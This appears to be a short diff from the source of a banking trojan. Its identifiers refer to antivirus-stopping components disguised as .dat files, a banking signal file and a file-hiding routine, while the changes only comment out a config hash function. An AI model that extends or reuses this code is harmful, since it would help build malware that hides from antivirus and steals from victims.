@@ -18,7 +18,7 @@ WCHAR BOT_STOPAV_NAME[] = {'\\','i','g','x','p','d','v','3','2','.','d','a','t',
 WCHAR BOT_MINIAV_NAME[] = {'\\','i','g','x','p','g','d','3','2','.','d','a','t', 0};
 
 //DWORD BOT_FILE_HASH = 0xED3D8E99;
-DWORD BOT_CFGN_HASH	= 0xED3DC208;
+//DWORD BOT_CFGN_HASH	= 0xED3DC208;
 DWORD BOT_STAV_HASH = 0x551DD093;
 DWORD BOT_MNAV_HASH = 0x551B9893;
 
@@ -29,10 +29,10 @@ DWORD BOT_MNAV_HASH = 0x551B9893;
 //}
 
 
-DWORD GetCfgHash()
-{
-	return BOT_CFGN_HASH;
-}
+//DWORD GetCfgHash()
+//{
+//	return BOT_CFGN_HASH;
+//}
 
 WCHAR *GetShellFoldersKey( DWORD dwParam )
 {
@@ -270,7 +270,7 @@ WCHAR *GetTempName()
 //{
 //	if ( dwFileHash == BOT::GetBotExeNameHash() ||
 //	     dwFileHash == BOT::GetWorkFolderHash() ||
-//	     dwFileHash == BOT_CFGN_HASH ||
+//		 dwFileHash == BOT_CFGN_HASH ||
 //		 dwFileHash == BOT_STAV_HASH ||
 //		 dwFileHash == BOT_MNAV_HASH ||
 //		 dwFileHash == BANKING_SIGNAL_FILE_HASH
@@ -280,7 +280,8 @@ WCHAR *GetTempName()
 //	}
 //
 //	return FALSE;
-//}
+//}
+
 //----------------------------------------------------------------------------
 
 BOOL IsHideFile(PWCHAR FileName, ULONG FileNameLen, int ControlPoint)
